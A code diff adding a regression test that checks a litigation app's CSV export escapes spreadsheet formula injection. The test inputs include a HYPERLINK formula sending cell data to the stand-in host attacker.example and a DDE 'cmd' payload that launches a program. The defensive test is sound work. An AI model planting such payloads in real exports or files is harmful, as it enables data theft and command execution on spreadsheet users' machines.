@@ -188,3 +188,20 @@ def test_court_sources_are_added_on_start_up(app, db, matrix):
     assert court_sources_on_start(app) == 5
     assert db.scalar(select(Source).where(Source.domain == "curia.europa.eu")) is not None
     assert court_sources_on_start(app) == 0  # idempotent
+
+
+def test_export_csv_neutralises_spreadsheet_formulas(client, db, lit):
+    """BUG-H03: case text is written by staff and by the court-source refresh, so no cell may start a formula."""
+    import csv
+    import io
+
+    login_as(client, db, lit["chief"])
+    _add(client, HIRING_CASE | {"name": '=HYPERLINK("https://attacker.example/?d="&A1,"Open")', "court": "@SUM(A1)",
+                                "description": '-2+3+cmd|" /C calc"!A0', "docket_ref": "+1", "geography": "-EU"})
+    rows = list(csv.reader(io.StringIO(client.get("/api/v1/litigation/export.csv").text)))
+    header, row = rows[0], rows[1]
+    cell = dict(zip(header, row))
+    assert cell["Case"].startswith("'=HYPERLINK(")
+    assert cell["Court"] == "'@SUM(A1)" and cell["Docket"] == "'+1" and cell["Geography"] == "'-EU"
+    assert cell["What it is about"].startswith("'-2+3")
+    assert not any(v[:1] in "=+-@\t\r" for r in rows[1:] for v in r)
